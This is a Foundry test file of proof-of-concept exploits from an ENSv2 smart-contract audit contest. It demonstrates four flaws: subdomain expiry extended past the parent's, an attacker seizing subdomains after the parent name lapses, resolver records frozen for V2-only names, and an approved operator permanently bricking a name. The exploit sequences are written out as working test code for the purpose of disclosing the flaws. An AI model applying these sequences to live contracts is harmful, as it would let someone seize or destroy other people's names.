// SPDX-License-Identifier: MIT
pragma solidity >=0.8.13;

// ENSv2 contest PoCs — /home/developer/contracts-v2 (HEAD 48b3e2d)
// Run: forge test --match-path test/poc/EnsV2AuditPoC.t.sol -vv

import {NameCoder} from "@ens/contracts/utils/NameCoder.sol";
import {
    INameWrapper,
    CANNOT_UNWRAP,
    CAN_EXTEND_EXPIRY,
    PARENT_CANNOT_CONTROL
} from "@ens/contracts/wrapper/NameWrapper.sol";

import {InvalidOwner, UnauthorizedCaller} from "~src/CommonErrors.sol";
import {LibLabel} from "~src/utils/LibLabel.sol";
import {ILabelStore} from "~src/utils/interfaces/ILabelStore.sol";
import {LibMigration} from "~src/migration/libraries/LibMigration.sol";
import {LockedMigrationController} from "~src/migration/LockedMigrationController.sol";
import {IRegistry} from "~src/registry/interfaces/IRegistry.sol";
import {IStandardRegistry} from "~src/registry/interfaces/IStandardRegistry.sol";
import {IPermissionedRegistry} from "~src/registry/interfaces/IPermissionedRegistry.sol";
import {RegistryRolesLib} from "~src/registry/libraries/RegistryRolesLib.sol";
import {IEnhancedAccessControl} from "~src/access-control/interfaces/IEnhancedAccessControl.sol";
import {WrapperRegistry, IWrapperRegistry} from "~src/registry/WrapperRegistry.sol";
import {IRegistryEvents} from "~src/registry/interfaces/IRegistryEvents.sol";
import {ApprovedUpgradeGate} from "~src/registry/ApprovedUpgradeGate.sol";
import {PublicResolverV2} from "~src/resolver/PublicResolverV2.sol";
import {IAddressSet} from "~src/utils/interfaces/IAddressSet.sol";
import {PermissionedAddressSet} from "~src/utils/PermissionedAddressSet.sol";
import {REGISTRATION_ROLE_BITMAP} from "~src/registrar/ETHRegistrar.sol";
import {MigrationControllerFixture} from "~test/fixtures/MigrationControllerFixture.sol";

contract EnsV2AuditPoC is MigrationControllerFixture {
    LockedMigrationController migrationController;
    ApprovedUpgradeGate approvedUpgradeGate;
    WrapperRegistry wrapperRegistryImpl;
    PermissionedAddressSet publicResolverSet;
    PublicResolverV2 publicResolver;

    address operator = makeAddr("operator");

    function setUp() external {
        deployMigrationControllerFixture();

        approvedUpgradeGate = new ApprovedUpgradeGate(address(this));
        publicResolverSet = new PermissionedAddressSet(address(this));
        publicResolver = new PublicResolverV2(nameWrapper, rootRegistry, contractNamer);

        wrapperRegistryImpl = new WrapperRegistry(
            nameWrapper,
            address(graveyard),
            verifiableFactory,
            address(ensV1Resolver),
            approvedUpgradeGate,
            labelStore,
            publicResolverSet,
            address(publicResolver),
            address(this) // namer
        );

        migrationController = new LockedMigrationController(
            nameWrapper,
            address(graveyard),
            ethRegistry,
            verifiableFactory,
            address(wrapperRegistryImpl),
            publicResolverSet,
            address(publicResolver),
            contractNamer
        );

        ethRegistry.grantRootRoles(
            RegistryRolesLib.ROLE_REGISTER_RESERVED,
            address(migrationController)
        );
    }

    ////////////////////////////////////////////////////////////////////////////
    // FINDING 1 (Low) — `PermissionedRegistry.renew` has no parent-expiry cap.
    // In ENSv1, `NameWrapper.extendExpiry`/`_normaliseExpiry` capped a wrapped
    // subname's expiry at the parent name's expiry. V2's renew() only checks
    // `newExpiry >= expiry`, so a migrated subdomain whose owner holds
    // ROLE_RENEW (CAN_EXTEND_EXPIRY fuse) can extend its expiry beyond the
    // parent's — a state ENSv1 prevented. The subdomain still becomes
    // unresolvable once the parent expires (parent registry returns no
    // subregistry), but the on-chain expiry record diverges from V1 semantics.
    ////////////////////////////////////////////////////////////////////////////

    function test_poc_subdomainRenew_beyondParentExpiry() external {
        bytes memory name2 = registerWrappedETH2LD(testLabel, CANNOT_UNWRAP);
        vm.prank(friend);
        bytes memory name3 = this.createWrappedChild(
            name2,
            "sub",
            CANNOT_UNWRAP | PARENT_CANNOT_CONTROL | CAN_EXTEND_EXPIRY
        );

        // migrate 2LD
        LibMigration.Data memory data2 = _lockedData(name2);
        vm.prank(testOwner);
        nameWrapper.safeTransferFrom(
            testOwner,
            address(migrationController),
            uint256(NameCoder.namehash(name2, 0)),
            1,
            abi.encode(data2)
        );
        IWrapperRegistry registry2 =
            IWrapperRegistry(address(ethRegistry.getSubregistry(data2.label)));

        // migrate 3LD
        LibMigration.Data memory data3 = _lockedData(name3);
        vm.prank(friend);
        nameWrapper.safeTransferFrom(
            friend,
            address(registry2),
            uint256(NameCoder.namehash(name3, 0)),
            1,
            abi.encode(data3)
        );

        uint256 tokenId = registry2.getTokenId(LibLabel.id(data3.label));
        assertTrue(registry2.hasRoles(tokenId, RegistryRolesLib.ROLE_RENEW, friend), "child RENEW");

        uint256 parentExpiry = ethRegistry.getExpiry(
            ethRegistry.getTokenId(LibLabel.id(data2.label))
        );

        // Extend the child beyond the parent's expiry — impossible in ENSv1
        // (expiry was normalised to the parent's expiry), possible in ENSv2.
        vm.prank(friend);
        registry2.renew(tokenId, uint64(parentExpiry) + 365 days);
        assertTrue(
            registry2.getExpiry(tokenId) > parentExpiry,
            "child expiry now exceeds parent expiry"
        );
    }

    ////////////////////////////////////////////////////////////////////////////
    // FINDING 3 (Medium) — Parent-lapse subtree takeover. When a migrated
    // locked .eth name expires and is re-registered, the new owner becomes the
    // "virtual owner" of the existing WrapperRegistry (WrapperRegistry._getRoles
    // maps root roles through parent.findOwner(childLabel)). The attacker then
    // holds the wrapper's ROOT roles (REGISTRAR | RENEW | UPGRADE | CAN_NAME +
    // admins) and can re-register expired subdomains to themselves — subdomain
    // owners typically cannot renew their own names (no CAN_EXTEND_EXPIRY →
    // no ROLE_RENEW), so every subdomain is forfeited on expiry.
    // In ENSv1 the parent's ERC1155 token never leaves the original owner on
    // expiry; a lapsed parent froze the subtree instead of handing it over.
    ////////////////////////////////////////////////////////////////////////////

    function test_poc_parentLapse_subtreeTakeover() external {
        address attacker = makeAddr("attacker");

        // Migrate locked 2LD "test" (CANNOT_CREATE_SUBDOMAIN not burned =>
        // wrapper root roles include REGISTRAR).
        bytes memory name2 = registerWrappedETH2LD(testLabel, CANNOT_UNWRAP);
        vm.prank(friend);
        bytes memory name3 = this.createWrappedChild(name2, "sub", CANNOT_UNWRAP | PARENT_CANNOT_CONTROL);

        LibMigration.Data memory data2 = _lockedData(name2);
        vm.prank(testOwner);
        nameWrapper.safeTransferFrom(
            testOwner,
            address(migrationController),
            uint256(NameCoder.namehash(name2, 0)),
            1,
            abi.encode(data2)
        );
        IWrapperRegistry wrapper =
            IWrapperRegistry(address(ethRegistry.getSubregistry(data2.label)));

        LibMigration.Data memory data3 = _lockedData(name3);
        vm.prank(friend);
        nameWrapper.safeTransferFrom(
            friend,
            address(wrapper),
            uint256(NameCoder.namehash(name3, 0)),
            1,
            abi.encode(data3)
        );

        uint256 subTokenId = wrapper.getTokenId(LibLabel.id(data3.label));
        // Subdomain owner has no RENEW (no CAN_EXTEND_EXPIRY fuse).
        assertFalse(wrapper.hasRoles(subTokenId, RegistryRolesLib.ROLE_RENEW, friend), "friend cannot renew");

        // Parent name lapses...
        uint256 parentTokenId = ethRegistry.getTokenId(LibLabel.id(data2.label));
        vm.warp(ethRegistry.getExpiry(parentTokenId) + 1);

        // ...and is re-registered by an attacker (root REGISTRAR holder path).
        vm.prank(premigrationController);
        uint256 newParentTokenId = ethRegistry.register(
            data2.label,
            attacker,
            IRegistry(address(wrapper)), // attacker keeps the existing subtree
            address(0),
            REGISTRATION_ROLE_BITMAP,
            uint64(block.timestamp + 365 days)
        );

        // Attacker is now the virtual owner: effective ROOT roles on the wrapper.
        assertEq(ethRegistry.getOwner(newParentTokenId), attacker, "attacker owns parent");
        assertTrue(
            wrapper.hasRoles(subTokenId, RegistryRolesLib.ROLE_RENEW, attacker),
            "attacker inherits root RENEW over the subtree"
        );

        // Subdomain expires (owner cannot renew)...
        vm.warp(wrapper.getExpiry(subTokenId) + 1);

        // ...and the attacker re-registers it to themselves (root REGISTRAR).
        vm.prank(attacker);
        wrapper.register(data3.label, attacker, IRegistry(address(0)), address(0), 0, uint64(block.timestamp + 365 days));

        uint256 seizedTokenId = wrapper.getTokenId(LibLabel.id(data3.label));
        assertEq(wrapper.getOwner(seizedTokenId), attacker, "subdomain seized");
        assertEq(wrapper.ownerOf(seizedTokenId), attacker, "seized token minted to attacker");
    }

    ////////////////////////////////////////////////////////////////////////////
    // FINDING 4 (Low/Info) — PublicResolverV2 is unusable for V2-only names.
    // `canModifyName` resolves the name preimage through the ENSv1 NameWrapper
    // (`NAME_WRAPPER.names(node)`); names registered only in V2 have no V1
    // preimage, so `canModifyName` returns false EVEN FOR THE OWNER — all
    // records of such a name are permanently unwritable. The team's own tests
    // always register the name in V1 first, so this case is untested.
    ////////////////////////////////////////////////////////////////////////////

    function test_poc_publicResolverV2_v2OnlyName_frozenRecords() external {
        // Fresh V2-only registration (no V1 NameWrapper preimage exists).
        vm.prank(premigrationController);
        ethRegistry.register(
            "fresh",
            testOwner,
            IRegistry(address(0)),
            address(publicResolver),
            REGISTRATION_ROLE_BITMAP,
            uint64(block.timestamp + 365 days)
        );
        bytes32 node = NameCoder.namehash(NameCoder.ethName("fresh"), 0);

        // Owner cannot modify their own records.
        assertFalse(publicResolver.canModifyName(node, testOwner), "owner cannot modify");
        vm.expectRevert();
        vm.prank(testOwner);
        publicResolver.setAddr(node, testOwner);
    }

    ////////////////////////////////////////////////////////////////////////////
    // FINDING 2 (Low/Medium) — ERC1155 marketplace approval grants irreversible
    // destructive power: an approved operator can revoke ALL of the owner's
    // admin roles (including ROLE_CAN_TRANSFER_ADMIN). Admin roles can never be
    // re-granted (PermissionedRegistry._getSettableRoles strips them), so the
    // name is permanently bricked: soulbound AND resolver/subregistry frozen.
    // This contradicts the documented invariant "Admin roles ... only revoked
    // from oneself". Role changes also regenerate the token ID (marketplace
    // listing breaks).
    ////////////////////////////////////////////////////////////////////////////

    function test_poc_operatorRevokeOwnerAdminRoles_bricksName() external {
        vm.prank(premigrationController);
        uint256 tokenId = ethRegistry.register(
            "alice",
            testOwner,
            IRegistry(address(0)),
            address(0),
            REGISTRATION_ROLE_BITMAP,
            _soon()
        );

        // Routine NFT marketplace flow: owner approves an operator.
        vm.prank(testOwner);
        ethRegistry.setApprovalForAll(operator, true);

        // Operator revokes every admin role from the owner.
        vm.prank(operator);
        ethRegistry.revokeRoles(tokenId, REGISTRATION_ROLE_BITMAP, testOwner);
        assertEq(ethRegistry.roles(tokenId, testOwner), 0, "owner stripped");

        // Role changes regenerate the token ID (burn + mint).
        tokenId = ethRegistry.getTokenId(LibLabel.id("alice"));

        // Irreversibility: owner cannot re-grant the admin roles.
        uint256 resource = ethRegistry.getResource(tokenId);
        vm.expectRevert(
            abi.encodeWithSelector(
                IEnhancedAccessControl.EACCannotGrantRoles.selector,
                resource,
                REGISTRATION_ROLE_BITMAP,
                testOwner
            )
        );
        vm.prank(testOwner);
        ethRegistry.grantRoles(tokenId, REGISTRATION_ROLE_BITMAP, testOwner);

        // Name is now permanently soulbound: owner cannot transfer.
        vm.expectRevert(
            abi.encodeWithSelector(IStandardRegistry.TransferDisallowed.selector, tokenId, testOwner)
        );
        vm.prank(testOwner);
        ethRegistry.safeTransferFrom(testOwner, friend, tokenId, 1, "");

        // Resolver/subregistry management also permanently frozen.
        vm.expectRevert(
            abi.encodeWithSelector(
                IEnhancedAccessControl.EACUnauthorizedAccountRoles.selector,
                resource,
                RegistryRolesLib.ROLE_SET_RESOLVER,
                testOwner
            )
        );
        vm.prank(testOwner);
        ethRegistry.setResolver(tokenId, address(0x1234));
    }
}
